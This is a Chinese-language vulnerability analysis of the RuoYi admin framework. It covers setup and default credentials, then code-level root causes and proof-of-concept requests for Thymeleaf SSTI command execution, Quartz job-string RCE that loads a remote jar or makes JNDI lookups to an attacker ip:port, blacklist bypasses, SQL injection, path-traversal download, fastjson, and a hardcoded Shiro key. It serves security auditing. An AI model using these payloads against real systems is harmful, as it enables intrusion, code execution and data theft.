# RuoYi若依

## 环境安装
*   （1）获取安装文件：`https://gitee.com/y_project/RuoYi`，选取自己想要的版本，解压文件夹
*   （2）安装mysql数据库，找到RuoYi文件夹中的sql文件`ry_20200323.sql`和`quartz.sql`。然后在mysql下执行如下命令：
```
create database ry; 创建名为ry的数据库
use ry; 使用ry数据库
source /RuoYi-v4.2/sql/ry_20200323.sql （改成自己系统下的绝对路径）
source /RuoYi-v4.2/sql/quartz.sql
```
*   （3）更改启动配置：找到文件夹中的`/RuoYi-v4.2/ruoyi-admin/src/main/resources/application.yml`，更改端口（默认80）和文件路径配置（Linux下默认`/home/ruoyi/uploadPath`）
*   （4）更改数据库配置：找到文件夹中的`/RuoYi-v4.2/ruoyi-admin/src/main/resources/application-druid.yml`，对主库数据源的用户名密码进行更改。
*   （5）更改日志配置：找到文件夹中的`/RuoYi-v4.2/ruoyi-admin/src/main/resources/logback.xml`，对日志存放路径进行更改。
*   （6）启动`RuoYi-v4.2/ruoyi-admin/src/main/java/com/ruoyi/RuoYiApplication.java`
*   （7）默认的用户名密码`admin admin123`


## 架构分析

RuoYi框架采用`SpringBoot`，身份认证采用`Apache Shiro`，持久层操作选用`Apache MyBatis+Hibernate Validation+Alibaba Druid`。视图层采用`Bootstrap+Thymeleaf`


## 已知漏洞

官方对历史漏洞进行了相关整理：https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E

 - [1.Thymeleaf SSTI RCE漏洞](#thymeleaf)
 - [2.定时计划反射漏洞](#定时计划)
 - [3.sql注入漏洞](#sql注入)
 - [4.任意文件下载漏洞](#任意文件下载)
 - [5.Fastjson RCE漏洞](#fastjson_rce)

|漏洞名称|访问路径|版本|
|:---:|:---:|:---:|
|Thymeleaf SSTI|`/monitor/cache/getNames`|<= v4.7.1|
|定时计划反射RCE|`系统监控—>定时任务—>添加任务->调用目标字符串`|<= v4.6.2|
|SQL注入|`/system/role/list`、`/system/dept/edit`|<= 4.6.1|
|任意文件下载|`/common/download/resource`|<= v4.5.0|
|Spring Framework反射型文件下载|-----|< v4.5.0|
|Shiro权限绕过、命令执行|-----|<= v4.3.0|
|Fastjson RCE|`/tool/gen/edit`|<= v4.2.0|

### thymeleaf

thymeleaf在Spring下的漏洞Demo参考：https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability

也就是说需要找到return后字符串可控或请求路径可控的地方，易受攻击的Demo如下
```java
@GetMapping("/path")
public String path(@RequestParam String lang) {
    return "user/" + lang + "/welcome"; //template path is tainted
}

@GetMapping("/fragment")
public String fragment(@RequestParam String section) {
    return "welcome :: " + section; //fragment is tainted
}

@GetMapping("/doc/{document}")
public void getDocument(@PathVariable String document) {
    log.info("Retrieving " + document);
}
```
对于路径上的Thymeleaf SSTI要特别注意。前面控制return字符串的，都是显式地告诉Spring要用什么样的视图，而路径那个demo是没有返回值的，也正因为没有return，Spring不知道采用什么样的视图，所以直接从URI中获取视图，但如果代码写成了如下的样子就无法解析URI作为视图。所以若依路径中的Thymeleaf注入点都是不可利用的。
```java
@GetMapping("/selectDictTree/{columnId}/{dictType}")
public String selectDeptTree(@PathVariable("columnId") Long columnId, @PathVariable("dictType") String dictType,
        ModelMap mmap)
{
    mmap.put("columnId", columnId);
    mmap.put("dict", dictTypeService.selectDictTypeByType(dictType));
    return prefix + "/tree";
}
```

另外，如果Thymeleaf应用时有以下情形也不容易受攻击：（1）方法上有`@ResponseBody`注解 （2）return是重定向类型的`return "redirect:"` （3）方法参数中包含`HttpServletResponse`。

若依采用了Thymeleaf，在代码中查看是否有易受攻击的场景，在4.7.1版本`CacheController`类中搜索到如下结果
```java
@PostMapping("/getNames")
public String getCacheNames(String fragment, ModelMap mmap)
{
    mmap.put("cacheNames", cacheService.getCacheNames());
    return prefix + "/cache::" + fragment;
}

@PostMapping("/getKeys")
public String getCacheKeys(String fragment, String cacheName, ModelMap mmap)
{
    mmap.put("cacheName", cacheName);
    mmap.put("cacheKyes", cacheService.getCacheKeys(cacheName));
    return prefix + "/cache::" + fragment;
}

@PostMapping("/getValue")
public String getCacheValue(String fragment, String cacheName, String cacheKey, ModelMap mmap)
{
    mmap.put("cacheName", cacheName);
    mmap.put("cacheKey", cacheKey);
    mmap.put("cacheValue", cacheService.getCacheValue(cacheName, cacheKey));
    return prefix + "/cache::" + fragment;
}
```
利用如下poc即可进行攻击
```
POST /monitor/cache/getNames HTTP/1.1

fragment=__${T%20(java.lang.Runtime).getRuntime().exec('open -a Calculator')}__::.x
```

### 定时计划
这里先需要说一下前置知识。所谓的定时计划，就是每隔一段时间完成某种操作，比如每隔5分钟写一行代码。定时任务中有一种叫Cron任务，它除了每隔一段时间重复执行还可以在某个具体的时间点执行，例如在凌晨1点写一行代码。Quartz是很常用的定时任务组件，它最简单的使用逻辑是先创建一个调度器，再定义一个JobDetail对其进行调度。
```
JobDetail jobDetail=JobBuilder.newJob(HelloJob.class).xxx
scheduler.scheduleJob(jobDetail,trigger);
scheduler.start();
```
这个HelloJob.class中定义了任务要执行的内容。根据Quartz组件的要求，此类需要实现Job接口，并将要执行的内容写在execute方法中。当定时任务开始执行，就调用execute方法。
```java
public class HelloJob implements Job {
    @Override
    public void execute(JobExecutionContext jobExecutionContext) throws JobExecutionException {...}
}
```

官方声明新增/修改定时任务`SysJobController`存在反序列化漏洞利用点，可以通过发送rmi、http、ldap请求完成攻击。SysJobController位于ruoyi-quartz模块。从SysJobController中无法看出rmi这种攻击的逻辑。既然是定时计划造成的漏洞，就对`org.quartz.Job`接口的实现类进行了一番搜索，发现如下类
```java
public abstract class AbstractQuartzJob implements Job{
    @Override
    public void execute(JobExecutionContext context) throws JobExecutionException
    {
        SysJob sysJob = new SysJob();
        BeanUtils.copyBeanProp(sysJob, context.getMergedJobDataMap().get(ScheduleConstants.TASK_PROPERTIES));
        try
        {
            before(context, sysJob); // 执行前
            if (sysJob != null)
            {
                doExecute(context, sysJob); // 执行方法由子类重载
            }
            after(context, sysJob, null); // 执行后
        }...
    }
}
```
核心的`doExecute()`执行方法是由子类进行重载的，查找`AbstractQuartzJob`的子类有两个`QuartzDisallowConcurrentExecution`（禁止并发执行）和`QuartzJobExecution`（允许并发执行），但是它们对doExecute的重载都指向同一个方法`JobInvokeUtil.invokeMethod()`
```java
    public static void invokeMethod(SysJob sysJob) throws Exception
    {
        String invokeTarget = sysJob.getInvokeTarget(); // 调用目标字符串invokeTarget，参数可传入
        String beanName = getBeanName(invokeTarget); // 获取bean名称，截取第一个(前的字符串中，最后一个.之前的字符串
        String methodName = getMethodName(invokeTarget); // 获取方法名称，截取第一个(前的字符串中，最后一个.之后的字符串
        List<Object[]> methodParams = getMethodParams(invokeTarget); // 获取方法参数，截取()之间的字符串，并以,分隔成字符串。参数类型只支持String，Boolean，Long，Double，Integer

        if (!isValidClassName(beanName)) // 要求bean名称最少包含两个. （return StringUtils.countMatches(invokeTarget, ".") > 1;）
        {
            Object bean = SpringUtils.getBean(beanName); // 从Spring的Beans中根据bean名称获取bean
            invokeMethod(bean, methodName, methodParams); // 调用方法
        }
        else
        {
            Object bean = Class.forName(beanName).newInstance(); // Spring中没有就根据名称获取类
            invokeMethod(bean, methodName, methodParams); // 调用方法
        }
    }
```
调用方法的代码是典型的反射
```java
    private static void invokeMethod(Object bean, String methodName, List<Object[]> methodParams)
            throws NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException,
            InvocationTargetException
    {
        if (StringUtils.isNotNull(methodParams) && methodParams.size() > 0)
        {
            Method method = bean.getClass().getDeclaredMethod(methodName, getMethodParamsType(methodParams));
            method.invoke(bean, getMethodParamsValue(methodParams));
        }
        else
        {
            Method method = bean.getClass().getDeclaredMethod(methodName);
            method.invoke(bean);
        }
    }
```
那么很直接的思路就是invokeTarget传一个恶意的类和方法，然后造成RCE。但是这个类对象要么在Spring容器中注册过，要么就反射newInstance获取（这种要求该类具备无参构造方法）。但是后续的反射代码中其实存在一些限制，一个是getDeclaredMethod后并没有加入`.setAccessible(true)`，所以调用的类方法不能是private的。方法的参数类型也进行了限制。

然后根据这些限制，网上常用的三种poc如下
```
org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://ip:port/yaml-payload.jar"]]]]')
org.springframework.jndi.JndiLocatorDelegate.lookup('rmi://ip:port/Evil')
javax.naming.InitialContext.lookup('ldap://ip:port/#Evil')
```
这三种都需属于出网利用方式，对于不出网利用的思路参照SnakeYaml的不出网思路。SnakeYaml不出网思路是先利用输出流写jar文件，然后利用ScriptEngineManager对生成的本地jar文件进行加载。但是若依对`,`会进行分割处理，也就限制了写文件的poc。但是如果可以通过文件上传传入jar文件，还可以利用ScriptEngineManager加载jar文件
```
org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["file://文件的绝对路径"]]]]')
```
后来的版本中，若依增加了黑名单对传入的字符串进行限制，不允许包含`rmi/http(s)/ldap`等字段。但是`file/ftp/ldaps`这些协议还可以利用。另外由于在获取方法参数时，代码对单引号会进行处理（替换为空），这样可以利用`'r'm'i`的方式来绕过黑名单

后续的4.7.2版本，若依对黑名单进行了升级，直接将`java.net.URL、javax.naming.InitialContext、org.yaml.snakeyaml、org.springframework.jndi`列入了黑名单。一种配置文件的绕过思路参考：https://xz.aliyun.com/t/10957

4.7.3版本，若依改采用白名单的方式，只允许调用com.ruoyi包中的类。

对于Spring中对象的利用，可以参考这篇思路：https://xz.aliyun.com/t/11336#toc-6

### sql注入
Mybatis配置一般用`#{}`，类似PreparedStatement的占位符效果，可以防止SQL注入，而RuoYi则是采用了`${}`造成了SQL注入，定位`SysDeptMapper.xml`。该文件中包含两处`${}`。Mybatis的.xml配置文件都实现了一个对应接口（一般与xml文件同名）的功能。所以`SysDeptMapper.xml`对应`SysDeptMapper`接口

`SysDeptMapper.xml`中的两处`${}`简略如下，id对应着接口方法，向上查找两个方法的调用入口分别是`/system/dept/list/`和`/system/dept/edit`。与`${params.dataScope}`类似的还有`SysRoleMapper.xml`文件中的`selectRoleList`方法，对应`/system/role/list`
```xml
<select id="selectDeptList" parameterType="SysDept" resultMap="SysDeptResult">
      <include refid="selectDeptVo"/>
      where d.del_flag = '0' ${params.dataScope} order by d.parent_id, d.order_num
</select>

<update id="updateDeptStatus" parameterType="SysDept">
 	    update sys_dept where dept_id in (${ancestors})
</update>
```
（1）注入点为`params.dataScope`，没有将结果回显的代码，所以可以采用报错注入的方式，如下
```
POST /system/role/list HTTP/1.1

params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
```
（2）注入点为`ancestors`，如下
```
POST /system/dept/edit HTTP/1.1

DeptName=1&DeptId=100&ParentId=12&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat((select user()))));#
```

### 任意文件下载

漏洞定位CommonController，代码如下
```
@GetMapping("/common/download/resource")
    public void resourceDownload(String resource, HttpServletRequest request, HttpServletResponse response) throws Exception
    {
        String localPath = Global.getProfile(); // 本地资源路径 xxx/uploadPath
        String downloadPath = localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX); // 数据库资源地址
        String downloadName = StringUtils.substringAfterLast(downloadPath, "/"); // 下载名称
        ...
        FileUtils.writeBytes(downloadPath, response.getOutputStream()); // 文件下载
    }
```
downloadPath会将`/profile`后的路径提取出来，然后和本地资源路径进行拼接，所以downloadPath需要为`/profile/xxx`。downloadName则是将最后一个`/`后的内容提取出来。

这里需要提一个知识点，一般常见的传参方式都是在方法参数前加入`@RequestParam、@PathVariable、@RequestBody`，如果是为非注解的方式传参，参数名称需要保持一致。

POC如下
```
GET /common/download/resource?resource=/profile/../pom.xml HTTP/1.1
```

### fastjson_rce

fastjson在若依4.2中的版本是1.2.60。搜索parseObject的调用，其中一个点如下，位于`GenTableServiceImpl`
```java
public void validateEdit(GenTable genTable)
{
    if (GenConstants.TPL_TREE.equals(genTable.getTplCategory())) // tplCategory属性值需要为tree
    {
        String options = JSON.toJSONString(genTable.getParams()); // 获取params属性，用fastjson进行解析
        JSONObject paramsObj = JSONObject.parseObject(options);
        ...
    }
}
```
再向上搜索入口点，即路径为`/tool/gen/edit`，参数为GenTable类型
```java
@RequiresPermissions("tool:gen:edit")
@Log(title = "代码生成", businessType = BusinessType.UPDATE)
@PostMapping("/edit")
@ResponseBody
public AjaxResult editSave(@Validated GenTable genTable)
{
    genTableService.validateEdit(genTable); // 调用
    genTableService.updateGenTable(genTable);
    return AjaxResult.success();
}
```
查看GenTable，对传入字段存在一些要求，有些在构造数据包时不能为空。另外，在父类`BaseEntity`中可以看到如下代码`private Map<String, Object> params;`，即params参数需要为Map类型
```java
public class GenTable extends BaseEntity
{
    @NotBlank(message = "表名称不能为空")
    private String tableName;

    @NotBlank(message = "表描述不能为空")
    private String tableComment;

    @NotBlank(message = "实体类名称不能为空")
    private String className;
    ...
}
```
一开始构造的Map类型的params参数值类似如下的格式，但是会报错`"Failed to convert property value of type 'java.lang.String' to required type 'java.util.Map' for property 'params'; nested exception is java.lang.IllegalStateException: Cannot convert value of type 'java.lang.String' to required type 'java.util.Map' for property 'params': no matching editors or conversion strategy found"`
```
params={
	"@type":xxx,
	...
}
```
其他必须的属性若用json格式发包则不识别，在如何构造符合条件的数据包时卡住。在后台`系统工具——>代码生成——>导入`一些表，然后在编辑表内容时，"生成信息"字段中看到了关于"树编码"的配置，这部分内容符合JSON解析的逻辑要求。进行抓包，发现params的数据格式如下
```
params[@type]=xxx&params[prefix]=xxx
```
根据此格式构造恶意的fastjson攻击包

### Shiro相关漏洞
4.2.0版本中，搜索关键字`setCipherKey`，可以发现密钥是固定的`fCq+/xW488hMTCD+cmJ3aQ==`，这样就可以对rememberMe字段进行构造，进行反序列化攻击
